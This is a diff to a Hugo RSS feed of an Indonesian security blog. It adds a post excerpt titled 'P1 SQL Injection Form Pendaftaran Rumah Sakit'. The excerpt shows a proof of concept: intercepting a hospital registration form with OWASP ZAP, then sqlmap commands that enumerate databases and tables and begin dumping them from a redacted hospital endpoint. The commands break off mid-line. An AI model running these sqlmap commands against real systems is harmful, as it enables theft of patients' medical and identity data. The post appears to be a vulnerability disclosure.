@@ -7,8 +7,15 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Bembenk</copyright>
-    <lastBuildDate>Sat, 18 Nov 2023 13:18:23 +0700</lastBuildDate>
+    <lastBuildDate>Thu, 28 Dec 2023 13:39:57 +0700</lastBuildDate>
     <atom:link href="https://bembenk.tech/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>P1 SQL Injection Form Pendaftaran Rumah Sakit</title>
+      <link>https://bembenk.tech/posts/sql-injection-form-pendaftaran-rumah-sakit/</link>
+      <pubDate>Thu, 28 Dec 2023 13:39:57 +0700</pubDate>
+      <guid>https://bembenk.tech/posts/sql-injection-form-pendaftaran-rumah-sakit/</guid>
+      <description>Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?&#xA;POC Buka form pendaftaran, isikan dengan random data Intercept post data dengan OWASP ZAP Setelah itu coba dengan sqlmap sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien&amp;#34; --data=&amp;#34;nomrm=Halo&amp;amp;tgllahir=2025-05-07&amp;amp;nik=9827982798279827&amp;amp;search=nomrm&amp;amp;tglperiksa=2023-12-07&amp;#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --dbs --threads 2 Lihat isi table invoice sqlmap -u &amp;#34;https://redacted.com/index.php/CProsesDaftar/getpasien&amp;#34; --data=&amp;#34;nomrm=Halo&amp;amp;tgllahir=2025-05-07&amp;amp;nik=9827982798279827&amp;amp;search=nomrm&amp;amp;tglperiksa=2023-12-07&amp;#34; --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database --tables Dump table sqlmap -u &amp;#34;https://redacted.</description>
+    </item>
     <item>
       <title>Allow Winbox Discovery</title>
       <link>https://bembenk.tech/posts/allow-winbox-discovery/</link>
